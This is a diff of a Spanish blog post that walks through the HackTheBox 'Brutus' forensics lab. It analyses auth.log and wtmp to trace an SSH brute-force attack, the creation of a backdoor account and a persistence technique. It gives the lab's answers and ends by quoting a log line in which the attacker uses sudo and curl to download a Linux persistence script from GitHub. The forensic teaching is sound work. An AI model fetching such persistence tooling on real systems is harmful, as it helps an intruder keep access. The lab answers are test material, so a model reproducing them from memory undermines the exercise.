@@ -8,7 +8,7 @@ published: true
 Los sherlocks (De HackTheBox) son retos gamificados enfocados a __Blue Team__, en ellos, se encuentran distintas situaciones donde uno debe utilizar herramientas de analsis y artefactos para completar las tareas. Y claro, hay __categorías__ según lo que quieras entrenar, como por ejemplo _DFIR_ (Digital Forensics and Incident Response) que se enfocan en el __análsis de artefactos forenses__ (es decir, trazas de ataques en los sistemas).
 
 
-![UTMP]({{ "/images/Brutus/logo.png" | relative_url }})
+![UTMP]({{ "/images/Brutus/logo.png" | relative_url }}){: .align-center}
 
 ## Resumen Brutus
 
@@ -30,7 +30,7 @@ En los archivos adjuntos, nos encontramos con 3 archivos:
 
 El script de python funciona bien para una funcionalidad básica (pero también pueden modificarlo para embellecer un poco la salida porque sale algo dispareja en consola) y es algo así:
 
-![UTMP]({{ "/images/Brutus/utmppy.png" | relative_url }})
+![UTMP]({{ "/images/Brutus/utmppy.png" | relative_url }}){: .align-center}
 
 Ya entendiendo los 2 archivos, podemos empezar a responder las preguntas del laboratorio:
 
@@ -40,7 +40,7 @@ Esta pregunta se resuelve observando detenidamente el Auth.log (que recordemos, 
 
 En cierto momento, podemos empezar a observar que se empiezan a hacer muchos intentos de autenticación con intentos fallidos sucesivos tras un usuario por uno; esta es la IP que registraremos:
 
-![UTMP]({{ "/images/Brutus/Q1.png" | relative_url }})
+![UTMP]({{ "/images/Brutus/Q1.png" | relative_url }}){: .align-center}
 
 ```
 Q1: 65.2.161.68
@@ -50,7 +50,7 @@ Q1: 65.2.161.68
 
 Ahora, si continuamos viendo detenidamente (Lo cual podemos hacer porque el log es _relativamente_ pequeño) veremos que en uno de los tantos renglones está el string __Accepted ...__ 
 
-![UTMP]({{ "/images/Brutus/Q2.png" | relative_url }})
+![UTMP]({{ "/images/Brutus/Q2.png" | relative_url }}){: .align-center}
 
 En el caso que no querramos complicarnos demasiado; podemos buscar directamente el string 'Accepted' como por ejemplo con `nano` con `Ctrl + W` Y buscando 'Accepted', claro, busca aquel que correlacione la IP del atacante (_65.2.161.68_) y el inicio de sesión exitoso y después de todos los intentos de inicio de sesión que ha hecho (también accede como otro usuario y auth.log lo marcará existoso pero en un momento iremos a ello).
 
@@ -66,21 +66,21 @@ Como observarás, en el wtmp, nos da un timestamp, pero este está presentado ut
 
 El método fácil la verdad es sólo hacer el cálculo, utilizamos __`date`__, ver en qué zona horaria estás y ver su diferencia con respecto al UTC, otra, es investigar sólo con google:
 
-![UTMP]({{ "/images/Brutus/UTCR.png" | relative_url }})
+![UTMP]({{ "/images/Brutus/UTCR.png" | relative_url }}){: .align-center}
 
 O si también quieres meterte con el sistema, puedes ejecutar el siguiente comando para cambiar la hora a UTC __`sudo timedatectl set-timezone UTC`__ Luego de ello, confirmar el cambio con `date` y volver a parsear wtmp:
 
-![UTMP]({{ "/images/Brutus/Q3.png" | relative_url }})
+![UTMP]({{ "/images/Brutus/Q3.png" | relative_url }}){: .align-center}
 
 ###### Nota: Para revertir el cambio del horario puedes cambiar el UTC por la zona horaria que tenías o utilizar `sudo timedatectl set-timezone <ZonaHoraria>` (busca las zonas horarias, no las abreviaturas)
 
 Ahora, ¿cuál ingresamos? Para ello tenemos que entender bien la pregunta, se nos dice que luego __el atacante ingresó manualmente__, los ataques de fuerza bruta generalmente prueban la credencial, determnan si es correcto o incorrecto y luego terminan la conexión; en auth.log podemos ver este comportamiento: El atacante ya con la credencial correcta, se desconecta pero poco después vuelve a conectarse:
 
-![UTMP]({{ "/images/Brutus/autha.png" | relative_url }}) 
+![UTMP]({{ "/images/Brutus/autha.png" | relative_url }}){: .align-center} 
 
 Esta, siendo la correspondiente al __brute force__ y...
 
-![UTMP]({{ "/images/Brutus/authb.png" | relative_url }})
+![UTMP]({{ "/images/Brutus/authb.png" | relative_url }}){: .align-center}
 
 Correspondiente al __ingreso manual__ poco tiempo después. 
 
@@ -94,7 +94,7 @@ Q3: 2024/03/06 06:32:45
 
 Esta pregunta se resuelve con la aclaración anterior de __auth.log__; sshd asignará un número sesión casi inmediatamente de la autenticación y puede verse claramente:
 
-![UTMP]({{ "/images/Brutus/authb.png" | relative_url }})
+![UTMP]({{ "/images/Brutus/authb.png" | relative_url }}){: .align-center}
 
 ```
 Q4: 37
@@ -106,7 +106,7 @@ Esta es una forma de persistencia, el atacante para tener acceso sin hacer más 
 
 Viendo el log, podremos notar varios servicios que emitieron un log que está relacionado con la actividad que buscamos: _groupadd_ y _useradd_ y para nuestra fortuna, podremos ver los cambios que ha hecho y el usuario creado:
 
-![UTMP]({{ "/images/Brutus/Q5.png" | relative_url }})
+![UTMP]({{ "/images/Brutus/Q5.png" | relative_url }}){: .align-center}
 
 ```
 Q5: cyberjunkie
@@ -116,7 +116,7 @@ Q5: cyberjunkie
 
 Habiendo aclarado que es una forma de persistencia; podemos buscar en internet tranquilamente; [Persistence - Mitre](https://attack.mitre.org/tactics/TA0003/) Y buscar por la que más se parezca a la acción, que es crear una cuenta.
 
-![UTMP]({{ "/images/Brutus/Q6.png" | relative_url }})
+![UTMP]({{ "/images/Brutus/Q6.png" | relative_url }}){: .align-center}
 
 Nos pregunta por la sub técnica, que es la acción específica realizada: _¿Creó una cuenta en un servicio de nube? ¿Creó la cuenta en un dominio (AD)? ¿Creó una cuenta local? ¿Creó otro tipo de cuenta?_ Estas preguntas nos ayudarán en identificar específicamente la sub técnica utilizada (o si no corresponde a una subtécnica). Como el atacante creó la cuenta sólo en la máquina, corresponde a la 001 (recuerda que el formato es T<ID Técnica>.<ID Sub Técnica>)
 
@@ -129,7 +129,7 @@ Q6: T1136.001
 Para resolver la pregunta, sólo tenemos que observar cuándo el usuario `cyberjunkie` (que sabemos es el atacante) ingresa mediante SSH:
 
 
-![UTMP]({{ "/images/Brutus/Q7a.png" | relative_url }})
+![UTMP]({{ "/images/Brutus/Q7a.png" | relative_url }}){: .align-center}
 
 ```
 Q7: 2024-03-06 06:37:24
@@ -139,7 +139,7 @@ Q7: 2024-03-06 06:37:24
 
 Poco más abajo del login, sin tanta complicación, podremos ver el servicio sudo generando un log y para llamar más la atención, un curl hacia github:
 
-![UTMP]({{ "/images/Brutus/Q8.png" | relative_url }})
+![UTMP]({{ "/images/Brutus/Q8.png" | relative_url }}){: .align-center}
 
 ```
 Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
